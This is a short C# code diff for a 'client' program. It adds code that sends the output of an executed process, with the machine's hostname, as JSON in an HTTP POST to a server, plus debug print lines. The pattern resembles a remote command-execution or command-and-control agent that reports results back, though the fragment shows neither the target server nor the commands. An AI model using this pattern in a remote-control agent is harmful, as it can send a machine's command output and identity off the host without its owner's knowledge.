@@ -140,7 +140,11 @@ namespace client
                         using (StreamReader reader = process.StandardOutput)
                         {
                             string result = reader.ReadToEnd();
+                            string responseBody = $"{{\"hostname\": \"{hostname}\",\"response\": \"{result}\"}}";
+                            (bool l, string a) = await BuildAndSendHTTPRequest(new StringContent(responseBody));
+
                             Console.WriteLine(result);
+                            
                         }
                     }
                 }
@@ -157,7 +161,9 @@ namespace client
         {
             try{
                 // send to server for registration
+                Console.WriteLine("sending");
                 HttpResponseMessage response = await httpclient.PostAsync(this.uri, content);
+                Console.WriteLine("sent");
                 response.EnsureSuccessStatusCode();
 
                 Console.WriteLine(await response.Content.ReadAsStringAsync());
